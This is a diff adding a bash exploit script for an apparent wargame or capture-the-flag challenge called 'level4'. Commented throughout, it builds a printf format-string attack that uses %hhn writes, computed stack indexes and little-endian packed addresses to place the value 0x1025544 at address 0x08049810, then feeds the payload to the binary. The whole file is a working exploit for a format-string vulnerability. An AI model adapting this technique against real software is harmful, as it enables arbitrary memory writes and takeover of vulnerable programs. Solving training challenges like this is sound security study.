@@ -1,0 +1,69 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Helper function, "compute '16 - 4'" gives "12"
+compute() { echo "$1" | bc | tr -d '\n' ; }
+
+# We have to write '0x1025544' at the address 0x08049810 to get the flag
+# The program use 'printf' with the input as a format string
+# We can use the '%n' conversion specifier to write a value to memory
+# We print 'k' characters, then '%i$hhn'
+# 'k' correspond to the value of the byte to write
+# 'i' correspond to the stack index where the address to write a byte is stored
+
+# Payload values
+ADDRESS_0="08049810"
+ADDRESS_1="08049811"
+ADDRESS_2="08049812"
+ADDRESS_3="08049813"
+VALUE_0="68"
+VALUE_1="85"
+VALUE_2="02"
+VALUE_3="01"
+
+# We compute the indexes for the different addresses
+# The first byte address is written at (buffer + 256)
+# Therefore, the stack index for the 'i' byte address is '(buffer + 256 - %esp)/4 + i'
+BUFFER_OFFSET_TO_ESP=48
+ADDRESSES_OFFSET_TO_ESP="$(compute "${BUFFER_OFFSET_TO_ESP} + 256")"
+PRINTF_WRITER_0_INDEX="$(compute "${ADDRESSES_OFFSET_TO_ESP} / 4 + 0")"
+PRINTF_WRITER_1_INDEX="$(compute "${ADDRESSES_OFFSET_TO_ESP} / 4 + 1")"
+PRINTF_WRITER_2_INDEX="$(compute "${ADDRESSES_OFFSET_TO_ESP} / 4 + 2")"
+PRINTF_WRITER_3_INDEX="$(compute "${ADDRESSES_OFFSET_TO_ESP} / 4 + 3")"
+
+# We print the different values, interlaced with the writers
+# We don't need to print the filler for VALUE_3 since we already wrote 16 bytes
+# PRINTF_VALUE_3_FILLER="%$(compute "${VALUE_3} - ${PRINTF_ADDRESSES_SIZE}")c"
+PRINTF_VALUE_3_FILLER="%${VALUE_3}c"
+PRINTF_WRITER_3="%${PRINTF_WRITER_3_INDEX}\$hhn"
+PRINTF_VALUE_2_FILLER="%$(compute "${VALUE_2} - ${VALUE_3}")c"
+PRINTF_WRITER_2="%${PRINTF_WRITER_2_INDEX}\$hhn"
+PRINTF_VALUE_0_FILLER="%$(compute "${VALUE_0} - ${VALUE_2}")c"
+PRINTF_WRITER_0="%${PRINTF_WRITER_0_INDEX}\$hhn"
+PRINTF_VALUE_1_FILLER="%$(compute "${VALUE_1} - ${VALUE_0}")c"
+PRINTF_WRITER_1="%${PRINTF_WRITER_1_INDEX}\$hhn"
+PRINTF_PAYLOAD=\
+"${PRINTF_VALUE_3_FILLER}${PRINTF_WRITER_3}"\
+"${PRINTF_VALUE_2_FILLER}${PRINTF_WRITER_2}"\
+"${PRINTF_VALUE_0_FILLER}${PRINTF_WRITER_0}"\
+"${PRINTF_VALUE_1_FILLER}${PRINTF_WRITER_1}"
+PRINTF_PAYLOAD_SIZE=$(echo -n "${PRINTF_PAYLOAD}" | wc -c)
+
+# We print the addresses to the bytes of '0x08049810' at (buffer + 256)
+PRINTF_ADDRESSES_ALIGNMENT_SIZE="$(compute "256 - ${PRINTF_PAYLOAD_SIZE}")"
+PRINTF_ADDRESSES_ALIGNMENT="$(put ${PRINTF_ADDRESSES_ALIGNMENT_SIZE} "A")"
+PRINTF_ADDRESS_0="$(hex_little_endian ${ADDRESS_0})"
+PRINTF_ADDRESS_1="$(hex_little_endian ${ADDRESS_1})"
+PRINTF_ADDRESS_2="$(hex_little_endian ${ADDRESS_2})"
+PRINTF_ADDRESS_3="$(hex_little_endian ${ADDRESS_3})"
+PRINTF_ADDRESSES="${PRINTF_ADDRESS_0}${PRINTF_ADDRESS_1}${PRINTF_ADDRESS_2}${PRINTF_ADDRESS_3}"
+
+# We print our exploit to the input to get the flag
+INPUT="${PRINTF_PAYLOAD}${PRINTF_ADDRESSES_ALIGNMENT}${PRINTF_ADDRESSES}"
+(echo "${INPUT}" && cat) | ./level4
